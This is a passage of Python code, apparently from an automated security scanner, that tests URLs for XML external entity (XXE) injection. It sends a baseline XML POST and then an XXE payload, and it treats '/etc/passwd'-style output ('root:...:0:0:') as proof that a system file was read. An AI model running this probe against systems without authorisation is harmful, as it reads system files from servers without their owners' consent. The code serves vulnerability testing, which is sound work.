              with open(os.path.join(rd,"evidence",category,f"{fid}.json"),"w") as f: json.dump(record,f,indent=2)
          def t(u):
              try:
                  breq=urllib.request.Request(u,data=b"<root/>",headers={"Content-Type":"application/xml"},method="POST")
                  bresp=urllib.request.urlopen(breq,timeout=10); base_body=bresp.read(20000).decode(errors="ignore"); base_st=bresp.status
              except urllib.error.HTTPError as e: base_body=e.read(20000).decode(errors="ignore"); base_st=e.code
              except Exception: base_body=""; base_st=0
              try:
                  req=urllib.request.Request(u,data=xxe.encode(),headers={"Content-Type":"application/xml"},method="POST")
                  resp=urllib.request.urlopen(req,timeout=10); body=resp.read(20000).decode(errors="ignore"); st=resp.status
              except urllib.error.HTTPError as e: body=e.read(20000).decode(errors="ignore"); st=e.code
              except: return None
              # Match the actual /etc/passwd structure (not just the word "root:", which
              # can appear on a totally unrelated page) and require it to be absent from
              # the baseline response, so it's clearly caused by the XXE payload itself.
              if re.search(r'root:.*:0:0:',body) and not re.search(r'root:.*:0:0:',base_body):
